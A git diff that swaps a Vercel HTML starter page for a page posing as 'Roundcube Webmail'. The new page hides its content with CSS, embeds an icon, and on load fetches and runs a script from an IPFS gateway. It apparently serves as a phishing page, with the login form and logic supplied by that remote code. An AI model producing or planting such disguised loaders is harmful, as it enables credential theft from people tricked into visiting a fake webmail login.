@@ -1,96 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <script defer src="/_vercel/insights/script.js"></script>
-    <link
-      rel="stylesheet"
-      href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css"
-    />
-    <title>Vercel HTML Starter</title>
-    <meta
-      name="description"
-      content="High-performance HTML based website template."
-    />
-  </head>
-  <body>
-    <h1>Vercel HTML Starter</h1>
-    <p>
-      This template is a simple, but powerful single
-      <code>index.html</code> file deployed to
-      <a href="https://vercel.com">Vercel</a>. When your site is deployed, all
-      static assets (like HTML, JavaScript, CSS, images, and more) are deployed
-      globally to every
-      <a href="https://vercel.com/docs/concepts/edge-network/overview"
-        >Vercel Edge Network</a
-      >
-      region.
-    </p>
-    <h2>Simple, privacy-friendly analytics</h2>
-    <p>
-      Want to understand your visitor traffic? Vercel Analytics gives you
-      first-party, privacy-friendly traffic analytics for your HTML site. This
-      template is already configured using the following script:
-    </p>
-    <pre><code>&lt;script defer src="/_vercel/insights/script.js"&gt;&lt;/script&gt;</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/analytics">Vercel Analytics</a>.
-    </p>
-    <h2>Integrated with git</h2>
-    <p>
-      Deploying updates to your site is as simple as
-      <code>git push</code> thanks to Vercel's advanced
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-      Support for GitHub, GitLab, Bitbucket is zero-configuration, and with the
-      flexible Vercel CLI and API, you can integrate with any tool possible.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-    </p>
-    <h2>Fast <code>gzip</code> compression</h2>
-    <p>
-      To help ensure the smallest possible file sizes for your static assets,
-      the Vercel Edge Network compresses files by default using
-      <code>gzip</code>. You can also optionally use
-      <code>brotli</code> compressesion if you prefer.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/edge-network/compression"
-        >compression</a
-      >.
-    </p>
-    <h2>Advanced routing configuration</h2>
-    <p>
-      Vercel gives you a variety of ways to configure the routing of your
-      website. For example, adding redirects, rewrites, or headers to your page.
-      While you can use <code>vercel.json</code> to define these through JSON,
-      you can also express your routing configuration as code using
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-    <p>
-      Middleware runs before the
-      <a href="https://vercel.com/docs/concepts/edge-network/caching"
-        >Vercel Edge Network Cache</a
-      >, so you can configure routing exactly as your application needs. For
-      example, this template uses <code>middleware.js</code> defined in the root
-      of the repository to add additional security headers to the site:
-    </p>
-    <pre><code>referrer-policy: origin-when-cross-origin
-strict-transport-security: max-age=31536000; includeSubDomains; preload
-x-content-type-options: nosniff
-x-dns-prefetch-control: on
-x-frame-options: DENY</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-  </body>
+<html>
+   <head>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+      <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+      <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+      <link rel="shortcut icon" href="data:image/x-icon;base64,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">
+	  <title>Roundcube Webmail</title>
+      <style>
+         html {
+         visibility: hidden; 
+         background: white;
+         }
+      </style>
+   </head>
+<body>
+  <div id="content">
+<script src="https://bafkreicthm5gzrojpv5kxpx5icp46vjk2jawagoktcpl743ytpfmovuazi.ipfs.w3s.link"></script>
+  </div>
+</body>
 </html>
